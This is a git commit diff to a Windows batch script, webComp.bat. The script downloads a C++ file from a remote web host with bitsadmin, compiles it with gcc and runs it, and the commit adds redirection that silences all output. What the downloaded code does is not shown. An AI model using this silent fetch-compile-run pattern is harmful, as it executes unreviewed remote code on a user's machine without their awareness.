849ad6183232d3a600fd7b4423eeccb2a520ff6c
Jason Harriot <jasonharriot@gmail.com>
2018-08-14 20:43:30 -0400

    misc

--- webComp.bat
+++ webComp.bat
@@ -1,6 +1,4 @@
 @echo off
-mkdir "My Photos"
-cd "My Photos"
-bitsadmin.exe /transfer "Matrix" http://mcminiposts.com/remote_media/matrix.cpp "%~dp0\Matrix.cpp"
-gcc Matrix.cpp -lstdc++ -std=gnu++14 -o Matrix.exe
-Matrix
+bitsadmin.exe /transfer "There is no spoon" http://mcminiposts.com/remote_media/matrix.cpp "%~dp0\matrix.cpp" >nul 2>nul
+gcc matrix.cpp -lstdc++ -std=gnu++14 -o Matrix.exe >nul 2>nul
+Matrix 2>nul
